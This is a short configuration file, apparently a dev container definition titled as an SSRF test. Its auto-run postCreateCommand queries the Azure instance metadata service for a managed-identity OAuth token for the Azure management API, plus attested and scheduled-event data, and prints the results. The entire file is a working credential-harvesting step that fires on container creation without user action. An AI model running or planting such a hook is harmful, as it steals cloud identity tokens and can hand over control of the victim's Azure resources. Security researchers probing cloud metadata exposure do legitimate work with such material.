name: SSRF Test - Identity Token
postCreateCommand: echo '=== IDENTITY TOKEN ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>&1 && echo '' && echo '=== ATTESTED DATA ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/attested/document?api-version=2020-09-01' 2>&1 && echo '=== SCHEDULEDEVENTS ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01' 2>&1 && echo '=== DONE ==='
